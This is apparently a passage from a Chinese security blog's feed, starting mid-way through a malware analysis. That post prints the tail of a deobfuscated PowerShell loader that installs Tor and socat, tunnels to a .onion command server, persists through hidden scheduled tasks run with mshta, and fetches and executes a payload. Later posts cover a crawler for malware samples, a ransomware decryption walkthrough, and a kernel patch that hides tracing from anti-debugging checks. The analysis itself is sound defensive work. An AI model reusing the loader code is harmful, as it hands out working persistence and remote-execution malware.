(Test-Path $7z)){Try{(New-Object System.Net.WebClient).DownloadFile(&#39;https://chocolatey.org/7za.exe&#39;,$7z);}Catch{}}if ($(Try { Test-Path $7z.trim() } Catch { $false })){Start-Process &quot;$7z&quot; -ArgumentList &quot;x -o`&quot;$destination`&quot; -y `&quot;$zipfile`&quot;&quot; -Wait -NoNewWindow}else{$shell = new-object -com shell.application;$zip = $shell.NameSpace($zipfile);foreach($item in $zip.items()){$shell.Namespace($destination).copyhere($item);}}}function Base64ToFile{param([string]$file, [string]$string);$bytes=[System.Convert]::FromBase64String($string);#set-content -encoding byte $file -value $bytes;[IO.File]::WriteAllBytes($file, $bytes);}function RandomString{    param([int]$min=5, [int]$max=15);    return (-join ((48..57)+(65..90)+(97..122) | Get-Random -Count (Get-Random -minimum $min -maximum $max) | % {[char]$_}));}function InitScheduller{    try{        Import-Module ScheduledTasks -ErrorAction Stop;        return $SH_TYPE_SCHEDULED_TASK;    }catch{        $File=$env:Temp+&#39;\&#39;+(RandomString)+&#39;.zip&#39;;        $Dest=$env:Temp+&#39;\&#39;+(RandomString);        while (!(iGgRLcyIJQBzrA &#39;https://api.nuget.org/packages/taskscheduler.2.5.23.nupkg&#39; $File)) {}        if ((Test-Path $Dest) -eq 1){Remove-Item -Force -Recurse $Dest;}mkdir $Dest | Out-Null;        FVRClsggMRAZ $File $Dest;        Remove-Item -Force $File;        $TSAssembly=$Dest+&#39;\lib\net20\Microsoft.Win32.TaskScheduler.dll&#39;;        $loadLib = [System.Reflection.Assembly]::LoadFile($TSAssembly);        return $SH_TYPE_TASK_SCHEDULER;    }}function xrnOlrj{param([string]$name, [string]$cmd, [string]$params=&#39;&#39;,[int]$restart=0,[int]$delay=0,[string]$dir=&#39;&#39;);switch ($schedulerType) {    $SH_TYPE_SCHEDULED_TASK {        $Action = New-ScheduledTaskAction -Execute $cmd;        if(-Not [String]::IsNullOrEmpty($params)){            $Action.Arguments=$params;        }        if(-Not [String]::IsNullOrEmpty($dir)){            $Action.WorkingDirectory=$dir;        }        $LogonTrigger = New-ScheduledTaskTrigger -AtLogOn;        try{            $LogonTrigger.UserId=$env:username;        }catch{            $LogonTrigger.User=$env:username;        }        if(-Not $delay -eq 0){            $LogonTrigger.Delay=New-TimeSpan -Seconds $delay;        }        if($restart -eq 1){            $TimeTrigger = New-ScheduledTaskTrigger -Once -At 12am -RepetitionInterval ([System.TimeSpan]::FromMinutes(1)) -RepetitionDuration ([System.TimeSpan]::FromDays(365 * 20));        }        $Settings = New-ScheduledTaskSettingsSet;        $Settings.DisallowStartIfOnBatteries = $False;        $Settings.StopIfGoingOnBatteries = $False;        if($restart -eq 1){            $Task = Register-ScheduledTask -Action $Action -Trigger $LogonTrigger,$TimeTrigger -Settings $Settings -TaskName $name -Description (RandomString);        }else{            $Task = Register-ScheduledTask -Action $Action -Trigger $LogonTrigger -Settings $Settings -TaskName $name -Description (RandomString);        }        Start-ScheduledTask -InputObject $Task;    };    Default {        $ts=New-Object Microsoft.Win32.TaskScheduler.TaskService;        $td=$ts.NewTask();        $td.RegistrationInfo.Description = (RandomString);        $td.Settings.DisallowStartIfOnBatteries = $False;        $td.Settings.StopIfGoingOnBatteries = $False;        $td.Settings.MultipleInstances = [Microsoft.Win32.TaskScheduler.TaskInstancesPolicy]::IgnoreNew;        $LogonTrigger = New-Object Microsoft.Win32.TaskScheduler.LogonTrigger;        $LogonTrigger.StartBoundary=[System.DateTime]::Now;        $LogonTrigger.UserId=$env:username;        $LogonTrigger.Delay=[System.TimeSpan]::FromSeconds($delay);        $td.Triggers.Add($LogonTrigger);        if($restart -eq 1){        $TimeTrigger = New-Object Microsoft.Win32.TaskScheduler.TimeTrigger;        $TimeTrigger.StartBoundary=[System.DateTime]::Now;        $TimeTrigger.Repetition.Interval=[System.TimeSpan]::FromMinutes(1);        $TimeTrigger.Repetition.StopAtDurationEnd=$False;        $td.Triggers.Add($TimeTrigger);        }        $tsf=&quot;Microsoft.Win32.TaskScheduler&quot;;        $ExecAction=New-Object &quot;$tsf.ExecAction&quot;($cmd,$params,$dir);        $td.Actions.Add($ExecAction);        $task=$ts.RootFolder.RegisterTaskDefinition($name, $td);        $task.Run();    };}}function iGgRLcyIJQBzrA {    param([string]$AETLcnitKnaNqr, [string]$aEntsBMtsayB);    $ErrorActionPreference = &quot;Stop&quot;;    Write-Host (&quot;Download {0} to {1}&quot; -f ($AETLcnitKnaNqr, $aEntsBMtsayB));    try {        Start-BitsTransfer -Source $AETLcnitKnaNqr -Destination $aEntsBMtsayB;    }    catch {        #Write-Error $_ -ErrorAction Continue;        try {            (New-Object System.Net.WebClient).DownloadFile($AETLcnitKnaNqr,$aEntsBMtsayB);        }        catch {            #Write-Error $_ -ErrorAction Continue;            Start-Process &quot;cmd.exe&quot; -ArgumentList &quot;/b /c bitsadmin /transfer /download /priority HIGH `&quot;$AETLcnitKnaNqr`&quot; `&quot;$aEntsBMtsayB`&quot;&quot; -Wait -WindowStyle Hidden;        }    }finally{        $ErrorActionPreference = &quot;Continue&quot;;    }    if ( $(Try { Test-Path $aEntsBMtsayB.trim() } Catch { $false })){        return $true;    }    return $false;}function IwoPMc{$schedulerType = InitScheduller;$tf=$env:Temp+&#39;\&#39;+(RandomString)+&#39;.zip&#39;;$DestTP=$env:ALLUSERSPROFILE+&#39;\&#39;+(RandomString);$TorMirrors=@(&quot;https://dist.torproject.org/&quot;,&quot;https://torproject.mirror.metalgamer.eu/dist/&quot;,&quot;https://tor.ybti.net/dist/&quot;);foreach ($mirror in $TorMirrors) {    $_url=$mirror+&#39;torbrowser/7.0.11/tor-win32-0.3.1.9.zip&#39;;    if((iGgRLcyIJQBzrA $_url $tf)){        break;    }}if ((Test-Path $DestTP) -eq 1){Remove-Item -Force -Recurse $DestTP;}mkdir $DestTP | Out-Null;FVRClsggMRAZ $tf $DestTP;Remove-Item -Force $tf;$ykF=$DestTP+&#39;\Tor\&#39;;$WqPfv=&quot;vbscript:close(CreateObject(`&quot;WScript.Shell`&quot;).Run(`&quot;tor.exe`&quot;,0,False))&quot;;xrnOlrj (RandomString) &#39;mshta.exe&#39; $WqPfv 0 0 $ykF;$SFile=$env:Temp+&#39;\&#39;+(RandomString)+&#39;.zip&#39;;while (!(iGgRLcyIJQBzrA &#39;https://github.com/StudioEtrange/socat-windows/archive/1.7.2.1.zip&#39; $SFile)){}FVRClsggMRAZ $SFile $DestTP;$s_old=$DestTP+&#39;\socat-windows-1.7.2.1\&#39;;$s_new=(RandomString);Remove-Item -Force $SFile;Rename-Item -path $s_old -newName $s_new;$dLkdOdvs=$DestTP+&#39;\&#39;+$s_new+&#39;\&#39;;$s1cmd=&#39;socat tcp4-LISTEN:5555,reuseaddr,fork,keepalive,bind=127.0.0.1 SOCKS4A:127.0.0.1:qr5c2etn6x5lhhfc.onion:80,socksport=9050&#39;;$s2cmd=&#39;socat tcp4-LISTEN:5588,reuseaddr,fork,keepalive,bind=127.0.0.1 SOCKS4A:127.0.0.1:qr5c2etn6x5lhhfc.onion:5588,socksport=9050&#39;;$SyASxV=&quot;vbscript:close(CreateObject(`&quot;WScript.Shell`&quot;).Run(`&quot;$s1cmd`&quot;,0,False))&quot;;$CkeHaEMoQb=&quot;vbscript:close(CreateObject(`&quot;WScript.Shell`&quot;).Run(`&quot;$s2cmd`&quot;,0,False))&quot;;xrnOlrj (RandomString) &#39;mshta.exe&#39; $SyASxV 0 0 $dLkdOdvs;xrnOlrj (RandomString) &#39;mshta.exe&#39; $CkeHaEMoQb 0 0 $dLkdOdvs;$wXdRbCFwn=&quot;vbsc&quot;+&quot;ript:close(CreateObject(`&quot;WScript.Shell`&quot;).Run(`&quot;powershell.exe `&quot;`&quot;`$F=`$env:Temp+&#39;\\&quot;+(RandomString)+&quot;.exe&#39;;rm -Force `$F;`$cl=(New-Object Net.WebClient);`$cl.DownloadFile(&#39;http://127.0.0.1:5555/&quot;+(RandomString)+&quot;.asp?ts&amp;ip=&#39;+`$cl.Download`&quot;+`&quot;String(&#39;http://api.ipify.org/&#39;),`$F);&amp; `$F`&quot;`&quot;`&quot;,0,False))&quot;;xrnOlrj (RandomString) &#39;mshta.exe&#39; $wXdRbCFwn 1;}IwoPMc;</code></pre><h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><ol><li><a href="https://stackoverflow.com/questions/16846386/run-javascript-function-from-c-without-mfc" target="_blank" rel="noopener">https://stackoverflow.com/questions/16846386/run-javascript-function-from-c-without-mfc</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;文件SHA256: f47717a4ae920921b69e8fd590c7a6353be08cad3cfc1a438c490b38e248d3f7&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;font color=&quot;red&quot;&gt;取标题无能，知道是啥
      
    
    </summary>
    
    
      <category term="病毒分析" scheme="http://shxi.me/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>病毒样本快到碗里来，一个样本下载爬虫的实现</title>
    <link href="http://shxi.me/posts/9222f001.html"/>
    <id>http://shxi.me/posts/9222f001.html</id>
    <published>2018-04-13T16:57:23.000Z</published>
    <updated>2018-04-14T09:34:53.474Z</updated>
    
    <content type="html"><![CDATA[<hr><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Malwar是一个使用了Cuckoo Sanbox的在线恶意软件分析系统，由于它提供一些病毒样本下载，就想能不能写个爬虫把样本下下来。顺便写篇博客记录下。<br>页面分析</p><p>打开 <a href="https://malwr.com/analysis" target="_blank" rel="noopener">https://malwr.com/analysis</a> ,我们可以当前页看到有TimeStamp、md5、文件名、文件类型和杀软查杀数，下一页类似。<br><img src="http://7vznhx.com1.z0.glb.clouddn.com/static/images/malwr_crawl/1.png" alt="图片说明" title="图片说明"></p><p>只有MD5的超链接可以点，点进去看看，<br><img src="http://7vznhx.com1.z0.glb.clouddn.com/static/images/malwr_crawl/2.png" alt="图片说明" title="图片说明"></p><p>我写这个的爬虫的目的是下载样本，只关心样本的下载地址，并不关心其他的信息。</p><p>现在我们可以理清下思路：</p><pre><code>   获取每一页的网页源码   解析当前页的每一个md5对应的详细信息链接   在详细信息页面解析下载地址。</code></pre><a id="more"></a><h2 id="提取规则"><a href="#提取规则" class="headerlink" title="提取规则"></a>提取规则</h2><p>先从第一页开始爬起</p><pre><code class="python">from scrapy.spiders import CrawlSpiderfrom scrapy.http import Requestfrom malwr.items import MalwrItemfrom scrapy.selector import Selectorclass BasicSpider(CrawlSpider):    name = &quot;basic&quot;    allowed_domains = [&quot;malwr.com&quot;]    strat_urls = [&#39;https://malwr.com/analysis/?page=1&#39;]    def start_requests(self):        url = self.strat_urls[0]         yield Request(url, callback=self.parse_item)    def parse_item(self):         pass</code></pre><p>scrapy支持xss选择器和css选择器，一般是用哪个比较方便就用哪个。</p><p><img src="http://7vznhx.com1.z0.glb.clouddn.com/static/images/malwr_crawl/3.png" alt="图片说明"></p><p>对应链接的xpath选择器为 <code>//td/a/@href</code>,<br><img src="http://7vznhx.com1.z0.glb.clouddn.com/static/images/malwr_crawl/4.png" alt="图片说明"></p><p>下一页的链接的xpath选择器为 <code>//a[contains(text(),&#39;Next&#39;)]/@href</code></p><p><img src="http://7vznhx.com1.z0.glb.clouddn.com/static/images/malwr_crawl/5.png" alt="图片说明"></p><p>要得到下载地址需要账号登陆，这里先不管它，单击Download下载文件对应的下载链接提取规则xpath选择器</p><p><code>//a[contains(@class,&#39;btn-primary&#39;)]/@href</code>.</p><p>现在来补充下代码，</p><pre><code class="python">def parse_item(self):      # 当前页所有md5对应的详细页面      url = response.xpath(&quot;//td/a/@href&quot;).extract()      for u in url:          url = urlparse.urljoin(&quot;https://malwr.com&quot;,u.encode(&quot;utf-8&quot;))          yield Request(url,self.parse_downurl)      # 下一页      nextpage = response.xpath(&quot;//a[contains(text(),&#39;Next&#39;)]/@href&quot;).extract()[0].encode(&#39;utf-8&#39;)      url = urlparse.urljoin(&quot;https://malwr.com&quot;,nextpage)      yield Request(url,self.parse_item) #解析下载地址def parse_downurl(self):      pass</code></pre><h2 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h2><p>之前写爬虫的时候，是可以直接通过post登陆的，而我开始写这篇文章的时候开始加上了google的ReCaptcha验证码。</p><p>只能换种方式使用selenium来登陆Malwr.得到登陆后的cookie后，我们就可以用这个cookie开始下载样本了。</p><pre><code class="python">from selenium import webdriverfrom selenium.webdriver.support.wait import WebDriverWaitdef get_cookie():        loginurl = &#39;https://malwr.com/account/login/&#39;        # 当然Ie也可以换成其他的，比如firefox、chrom等等        driver = webdriver.Ie()        driver.get(loginurl)        WebDriverWait(driver,3).until(lambda x:x.find_element_by_link_text(&#39;Logout&#39;))        cookies = driver.get_cookies()        driver.close()        return cookies</code></pre><p>使用Scrapy有一点很蛋疼，cookie它不会自动传递，需要自己在Request中传递下去，才能使后面的网络请求使用这个cookie.</p><pre><code class="python">class BasicSpider(CrawlSpider):    name = &quot;basic&quot;    allowed_domains = [&quot;malwr.com&quot;]    strat_urls = [&#39;https://malwr.com/analysis/?page=1&#39;]    custom_settings = {                    &quot;COOKIES&quot;:get_cookie(),                    }    def start_requests(self):        url = self.strat_urls[0]        # cookiejar  cookie传递        yield Request(url,cookies=self.custom_settings[&#39;COOKIES&#39;],                          callback=self.parse_item,meta = {&#39;cookiejar&#39; : 1})    def parse_item(self,response):          # 当前页所有md5对应的详细页面          url = response.xpath(&quot;//td/a/@href&quot;).extract()          for u in url:              url = urlparse.urljoin(&quot;https://malwr.com&quot;,u.encode(&quot;utf-8&quot;))              yield Request(url,self.parse_downurl,meta = {&#39;cookiejar&#39; : 1})          # 下一页          nextpage = response.xpath(&quot;//a[contains(text(),&#39;Next&#39;)]/@href&quot;).extract()[0].encode(&#39;utf-8&#39;)          url = urlparse.urljoin(&quot;https://malwr.com&quot;,nextpage)          yield Request(url,self.parse_item,meta = {&#39;cookiejar&#39; : 1})</code></pre><p>我们在start_request函数里获取到登陆后的cookie,使用<code>meta = {&#39;cookiejar&#39; : 1}</code>将cookie传递到parse_item函数。</p><p>parse_item函数的Request的两个Request也加上cookiejar,一个把cookie传给parse_item,一个传给parse_downurl,<br>下载样本</p><p>scrapy本身就已经为我们提供了很好的文件下载、图片下载的功能，</p><p>修改custom_settings,加上我们要用的ITEM_PIPELINES(在这里面实现下载功能)和FILES_STORE(保存到的文件夹)</p><pre><code>custom_settings = {                  &quot;COOKIES&quot;:get_cookie(),                  &#39;ITEM_PIPELINES&#39;:{&#39;malwr.pipelines.MalwrPipeline&#39;:1},                  &quot;FILES_STORE&quot;:&quot;E:\\Virus\\Malwr&quot;                  }</code></pre><p>FilesPipeline是从file_urls中拿到下载地址然后开始下载文件，因此我们还需要Item.py定义一个file_urls.</p><pre><code class="python"># Define here the models for your scraped items## See documentation in:# http://doc.scrapy.org/en/latest/topics/items.htmlimport scrapyclass MalwrItem(scrapy.Item):    # define the fields for your item here like:    # name = scrapy.Field()    file_urls = scrapy.Field()</code></pre><p>在piplines.py文件实现文件的下载方法,继承FilesPipeline下载文件。</p><p>由于下载文件需要cookie，因此重写了构造函数和get_media_requests函数，在Request中加上了cookies参数.</p><p>我们在custom_settings中保存了cookie，这里直接使用getlist拿到登陆后的cookie.</p><pre><code class="python"># Define your item pipelines here## Don&#39;t forget to add your pipeline to the ITEM_PIPELINES setting# See: http://doc.scrapy.org/en/latest/topics/item-pipeline.htmlfrom scrapy.http import Requestfrom scrapy.pipelines.files import FilesPipelineclass MalwrPipeline(FilesPipeline):    cookies = []    def __init__(self, store_uri, download_func=None, settings=None):        super(MalwrPipeline,self).__init__(store_uri, download_func,settings)        self.cookies = settings.getlist(&quot;COOKIES&quot;)    # 开始下载文件    def get_media_requests(self, item, info):        for file_url in item[&#39;file_urls&#39;]:            yield Request(file_url,cookies=self.cookies)</code></pre><p>解析下载地址，将解析到的下载链接列表放入item的file_urls,返回item。pipeline会file_urls拿到链接开始调用get_media_requests下载文件</p><pre><code class="python">    def parse_downurl(self,response):        try:            # 提取点击下载按钮的下载地址            url = response.xpath(&quot;//a[contains(@class,&#39;btn-primary&#39;)]/@href&quot;).extract()[0].encode(&#39;utf-8&#39;)            url = urlparse.urljoin(&quot;https://malwr.com&quot;,url)            item = MalwrItem()            item[&#39;file_urls&#39;] = [url]            return item        except Exception,e:            passreturn</code></pre><p>最后附上完整的源码 <a href="https://github.com/ydc1992/Malwr" target="_blank" rel="noopener">https://github.com/ydc1992/Malwr</a></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;Malwar是一个使用了Cuckoo Sanbox的在线恶意软件分析系统，由于它提供一些病毒样本下载，就想能不能写个爬虫把样本下下来。顺便写篇博客记录下。&lt;br&gt;页面分析&lt;/p&gt;
&lt;p&gt;打开 &lt;a href=&quot;https://malwr.com/analysis&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://malwr.com/analysis&lt;/a&gt; ,我们可以当前页看到有TimeStamp、md5、文件名、文件类型和杀软查杀数，下一页类似。&lt;br&gt;&lt;img src=&quot;http://7vznhx.com1.z0.glb.clouddn.com/static/images/malwr_crawl/1.png&quot; alt=&quot;图片说明&quot; title=&quot;图片说明&quot;&gt;&lt;/p&gt;
&lt;p&gt;只有MD5的超链接可以点，点进去看看，&lt;br&gt;&lt;img src=&quot;http://7vznhx.com1.z0.glb.clouddn.com/static/images/malwr_crawl/2.png&quot; alt=&quot;图片说明&quot; title=&quot;图片说明&quot;&gt;&lt;/p&gt;
&lt;p&gt;我写这个的爬虫的目的是下载样本，只关心样本的下载地址，并不关心其他的信息。&lt;/p&gt;
&lt;p&gt;现在我们可以理清下思路：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;   获取每一页的网页源码
   解析当前页的每一个md5对应的详细信息链接
   在详细信息页面解析下载地址。
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="爬虫" scheme="http://shxi.me/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>一款勒索软件的分析-未完待续</title>
    <link href="http://shxi.me/posts/4c8ebd7f.html"/>
    <id>http://shxi.me/posts/4c8ebd7f.html</id>
    <published>2018-04-13T16:56:09.000Z</published>
    <updated>2018-04-13T16:59:56.805Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>文件信息 SHA1:1d03f92b8f824bb065552f0d9e6ddddb</p></blockquote><h2 id="NSIS脚本分析"><a href="#NSIS脚本分析" class="headerlink" title="NSIS脚本分析"></a>NSIS脚本分析</h2><p>使用7zip解压，可以看到其中一个文件是乱码，可能是加密的shellcode。</p><p><img src="http://7vznhx.com1.z0.glb.clouddn.com/static/images/1021_troj/2.png" alt="图片说明" title="图片说明"></p><p>下图是nsis的脚本，前面有很多都是无用的代码，一般都是首先看.oninit回调函数。</p><p>我们可以看到它通过wsprintf来拼接字符串，使用nsis的system.dll来调用外部dll。 将加密的shellcode映射到内存,</p><p> <img src="http://7vznhx.com1.z0.glb.clouddn.com/static/images/1021_troj/1.png" alt="图片说明" title="图片说明"><br><a id="more"></a><br>另外system::call相关语法可以在<a href="http://nsis.sourceforge.net/Docs/System/System.html" target="_blank" rel="noopener">http://nsis.sourceforge.net/Docs/System/System.html</a> 找到。</p><p>最终通过</p><pre><code class="cpp">    System::Call &quot;$5p r13, i 66576)</code></pre><p>进入shellcode执行代码，shellcode入口点地址是r12,即<code>$R1 + 73991</code>。R1等于r11,也就是调用readFile函数时返回得文件buffer.</p><p>r13为加密PE文件，大小为66576，地址为0x83c0e69(<code>$R1 + 3689</code>);</p><h2 id="加密文件分析"><a href="#加密文件分析" class="headerlink" title="加密文件分析"></a>加密文件分析</h2><h3 id="解密shellcode"><a href="#解密shellcode" class="headerlink" title="解密shellcode"></a>解密shellcode</h3><p>载入OD，直接在System.dll!Int640p函数下断，</p><p> <img src="http://7vznhx.com1.z0.glb.clouddn.com/static/images/1021_troj/32.png" alt="图片说明" title="图片说明"> </p><p>文件被映射到0x83c0000,因此shellcode的入口点在0x83d2107。</p><p>来到0x83d2107处，</p><p> <img src="http://7vznhx.com1.z0.glb.clouddn.com/static/images/1021_troj/4.png" alt="图片说明" title="图片说明"></p><p>查找内存值为0xDEADBEEF的内存地址，0xDEADBEEF为加密标志，表示后面的内容是加密的。</p><pre><code class="x86asm">        mov ecx,0xDEADBEEF        call 083D216C          mov dword ptr ss:[esp],eax ;esp=0x83d2118        mov ebx,dword ptr ss:[esp]        inc ebx        cmp dword ptr ds:[ebx],ecx        jnz X083D211E</code></pre><p>0xDEADBEEF后面有2个比较重要的数据。</p><pre><code class="cpp">struct stc_encode{    DWORD flag; //0xDEDBEEF    DWORD codeSize;    DWORD originCode_head; //未加密代码头四个字节    char  encode_code[codeSize];}</code></pre><p>从下面这段汇编代码可以看出，它没有把xor key硬编码到程序中，而是通过暴破的方式获取xor key。这个样本最后查找到的xor key为</p><p>0x6b891276</p><pre><code class="x86asm">        mov edx,dword ptr ss:[esp+0xC] ;[esp+0xc] 异或后的函数头部        mov edx,dword ptr ds:[edx]        xor edx,ebx        cmp edx,dword ptr ss:[esp+0x8] ;[esp+0x8] 原始函数头部        je X083D214B        inc ebx       ;从0开始递增xor key,        jmp X083D213A</code></pre><p>找到key，随后就是解密异或后的代码。</p><pre><code class="x86asm">        mov dword ptr ss:[esp+0x10],ebx;xor key        nop        nop        nop        mov edx,dword ptr ss:[esp+0xC]        xor ecx,ecx        xor dword ptr ds:[edx+ecx],ebx        cmp ecx,dword ptr ss:[esp+0x4]        jge X083D2166        add ecx,0x4        jmp X083D2158        mov esp,ebp        pop ebp        pop ebx        jmp edx ;跳到解密后的函数执行</code></pre><p>这里<code>jmp edx</code>跳转到解密后的shellcode执行。继续以同样的方式解密3次，且每次的xor key都不一样。</p><h3 id="解密PE文件"><a href="#解密PE文件" class="headerlink" title="解密PE文件"></a>解密PE文件</h3><p> <img src="http://7vznhx.com1.z0.glb.clouddn.com/static/images/1021_troj/5.png" alt="图片说明" title="图片说明"> </p><p>通过 find_api_address找到所需要的函数并拷贝到堆栈。调用这些函数时使用 <code>call [ebp-xx]</code>调用。</p><p> <img src="http://7vznhx.com1.z0.glb.clouddn.com/static/images/1021_troj/6.png" alt="图片说明" title="图片说明"> </p><blockquote><p>decrypt_pe有三个参数:被加密PE文件buffer、文件大小和密钥。该函数通过使用Crypt API来解密,返回解密后的PE文件地址。</p></blockquote><p> <img src="http://7vznhx.com1.z0.glb.clouddn.com/static/images/1021_troj/7.png" alt="图片说明" title="图片说明"> </p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;文件信息 SHA1:1d03f92b8f824bb065552f0d9e6ddddb&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;NSIS脚本分析&quot;&gt;&lt;a href=&quot;#NSIS脚本分析&quot; class=&quot;headerlink&quot; title=&quot;NSIS脚本分析&quot;&gt;&lt;/a&gt;NSIS脚本分析&lt;/h2&gt;&lt;p&gt;使用7zip解压，可以看到其中一个文件是乱码，可能是加密的shellcode。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7vznhx.com1.z0.glb.clouddn.com/static/images/1021_troj/2.png&quot; alt=&quot;图片说明&quot; title=&quot;图片说明&quot;&gt;&lt;/p&gt;
&lt;p&gt;下图是nsis的脚本，前面有很多都是无用的代码，一般都是首先看.oninit回调函数。&lt;/p&gt;
&lt;p&gt;我们可以看到它通过wsprintf来拼接字符串，使用nsis的system.dll来调用外部dll。 将加密的shellcode映射到内存,&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;http://7vznhx.com1.z0.glb.clouddn.com/static/images/1021_troj/1.png&quot; alt=&quot;图片说明&quot; title=&quot;图片说明&quot;&gt;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>AOSP-docker编译安卓源码绕过反调试</title>
    <link href="http://shxi.me/posts/7b82cd68.html"/>
    <id>http://shxi.me/posts/7b82cd68.html</id>
    <published>2018-04-13T16:48:50.000Z</published>
    <updated>2018-04-13T17:00:06.535Z</updated>
    
    <content type="html"><![CDATA[<p>看了很多编译源码的文章，发现很多都有坑，大部分都是环境配置问题，编译不同版本的源码jdk版本不一样，ubuntu版本也不一样。这很让人蛋疼，光是折腾环境就得半天了。</p><p>自从有了docker就不一样了，有人把Android源码编译的环境打包成了docker，就是AOSP docker;这样我们就不需要去折腾环境,直接拿人家弄好的来用。</p><p>推荐使用linux装docker，不用管是debian还是ubuntu;虽然windows也可以使用docker，但是还是有点小问题。<br><a id="more"></a></p><h2 id="分配硬盘"><a href="#分配硬盘" class="headerlink" title="分配硬盘"></a>分配硬盘</h2><p>linux至少要分配100g的硬盘空间。空间足够的可以跳过，原本装有VMWare linux，但是空间不足，又不想重新装个虚拟机。 可以参考 这篇文章<a href="http://blog.csdn.net/u010372981/article/details/46514011" target="_blank" rel="noopener">http://blog.csdn.net/u010372981/article/details/46514011</a> 给虚拟机加块硬盘。</p><h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><p>默认源中没有docker,我们需要在添加backports源，在/etc/apt/sources.list文件 加入下面这行</p><pre><code>  deb http://http.debian.net/debian jessie-backports main</code></pre><p>运行如下命令安装docker</p><pre><code>apt-get updateapt-get install docker.io</code></pre><h2 id="开始编译"><a href="#开始编译" class="headerlink" title="开始编译"></a>开始编译</h2><p>1.开始之前先启动docker服务,不然到后面会报错</p><pre><code> /etc/init.d/docker start</code></pre><p>2.设置AOSP_VOL环境变量,设置为你要存放源码的路径,给VMWare添加硬盘扩容的设置成挂载的硬盘的路径。我设置的/Android路径</p><pre><code>export AOSP_VOL=/Android</code></pre><p>3.下载Wrapper脚本,我这里演示编译kitkat(Android 4.4),编译其他版本可以参考<a href="https://github.com/tiann/docker-aosp" target="_blank" rel="noopener">https://github.com/tiann/docker-aosp</a>, 脚本根对国内环境做了优化，使用速度比较快的清华源。</p><pre><code>curl -O https://raw.githubusercontent.com/tiann/docker-aosp/master/tests/build-kitkat.sh</code></pre><p>4.编译源码,直接运行上一步下载下来的源码。该脚本会下载docker镜像，并且下载Android源码到AOSP_VOL指定的路径，然后编译。</p><pre><code>sh ./build-kitkat.sh</code></pre><p>编译完成后,使用的是系统默认自带的内核，我们还需要重新修改编译内核绕过反调试</p><h2 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h2><ol><li>clone内核源码 我使用的手机是Nexus 5,对应的内核源码为kernel/msm。设备名是hammerhead</li></ol><p>在存放源码的目录创建kernel文件夹，我这里存放源码目录为/Android</p><pre><code>cd /Android/aospmkdir kernelcd kernelgit clone https://aosp.tuna.tsinghua.edu.cn/kernel/msm.git</code></pre><ol><li>选择系统版本 切换到克隆下来的源码目录，切换分支</li></ol><pre><code>git branch -a</code></pre><p>找到名字带有 hammerhead的。</p><pre><code>git checkout remotes/origin/android-msm-hammerhead-3.4-kitkat-mr1</code></pre><ol><li>修改源码</li></ol><p>需要修改<code>kernel/msm/fs/proc/base.c</code>和<code>kernel/msm/fs/proc/array.c</code>两个文件</p><p>base.c中 <code>proc_pid_wchan</code>函数部分修改成如下：</p><pre><code>//省略else {           if (strstr(symname, &quot;trace&quot;)) {                return sprintf(buffer, &quot;%s&quot;, &quot;sys_epoll_wait&quot;);           }           return sprintf(buffer, &quot;%s&quot;, symname);      }</code></pre><p>array.c中<code>tast_state</code>函数部分修改成</p><pre><code>&quot;Gid:\t%d\t%d\t%d\t%d\n&quot;,              get_task_state(p),              task_tgid_nr_ns(p, ns),              pid_nr_ns(pid, ns),              ppid, /*tpid*/0,              cred-&gt;uid, cred-&gt;euid, cred-&gt;suid, cred-&gt;fsuid,              cred-&gt;gid, cred-&gt;egid, cred-&gt;sgid, cred-&gt;fsgid);</code></pre><p><code>task_state_array</code>变量修改成</p><pre><code class="cpp">static const char * const task_state_array[] = {     &quot;R (running)&quot;,        /*    0 */     &quot;S (sleeping)&quot;,       /*    1 */     &quot;D (disk sleep)&quot;,     /*    2 */     &quot;S (sleeping)&quot;,       /*    4 */     &quot;S (sleeping)&quot;, /*     8 */     &quot;Z (zombie)&quot;,         /*  16 */     &quot;X (dead)&quot;,           /*  32 */     &quot;x (dead)&quot;,           /*  64 */     &quot;K (wakekill)&quot;,       /* 128 */     &quot;W (waking)&quot;,         /* 256 */};</code></pre><ol><li>创建编译脚本 在<code>/Android/aosp/kernel/msm</code>目录,即内核源码所在的目录创建一个脚本，内容如下,保存为run.sh. PATH前面的gcc路径为编译工具链,用来编译内核的。</li></ol><pre><code class="bash">export PATH=&#39;/Android/aosp/prebuilts/gcc/linux-x86/arm/arm-eabi-4.6/bin&#39;;$PATHexport ARCH=armexport SUBARCH=armexport CROSS_COMPILE=arm-eabi-make hammerhead defconfigmake -j4</code></pre><p>然后运行该脚本开始编译内核</p><pre><code>sh run.sh</code></pre><p>出现如下提示表示内核已经编译ok</p><pre><code>CALL    scripts/checksyscalls.shCHK     include/generated/compile.hKernel: arch/arm/boot/Image is readyLD      arch/arm/boot/compressed/vmlinuxOBJCOPY arch/arm/boot/zImageKernel: arch/arm/boot/zImage is readyCAT     arch/arm/boot/zImage-dtbKernel: arch/arm/boot/zImage-dtb is ready</code></pre><p>在<code>/Android/aosp/kernel/msm/arch/arm/boot</code>找到zImage-dtb,这个是nexus 